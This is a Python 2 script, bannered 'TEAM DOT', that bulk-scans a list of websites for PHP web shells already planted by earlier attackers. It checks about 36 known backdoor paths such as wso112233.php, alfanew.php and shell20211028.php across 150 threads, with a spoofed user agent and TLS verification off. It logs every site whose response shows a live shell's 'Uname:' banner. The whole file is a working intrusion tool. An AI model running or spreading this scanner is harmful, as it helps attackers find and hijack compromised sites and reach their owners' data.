import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
                            TEAM DOT
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/wp-content/plugins/core/include.php','/ws.php','/404.php','/wp.php','/wp-head.php','/wp-includes/wp-class.php','/wp-content/themes/twenty/twenty.php','/wp-content/plugins/press/wp-class.php','/fm1.php','/alfadheat.php','/M1.php','/admin.php','/wp-admin/images/admin.php','/alfanew.php7','/.well-known/wso112233.php','/about.php','/wp-content/shell20211028.php','/repeater.php','/wp-content/themes/finley/min.php','/wso112233.php','/dropdown.php','/wp-admin/dropdown.php','/shell20211028.php','/wp-content/plugins/Cache/Cache.php','/wp-includes/IXR/themes.php','/.well-known/pki-validation/about.php','/wp-header.php','/alfanew.php','/wp-includes/ID3/about.php','/wp-2019.php','/autoload_classmap.php','/wp-includes/ID3/wp-login.php','/wp-includes/SimplePie/plugins.php','/wp-content/plugins/alfa-rex.php','/wp-content/plugins/about.php','/wp-content/themes/about.php']
class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Uname:" in check):
					print('Test:{} - {} Succefully').format(url, fg)
					open('pach.txt','a').write(url + Path + "\n")
					break
				else:
					print('Test:{} - {} Failid').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(150)
mp.map(RunUploader, target)
mp.close()
mp.join()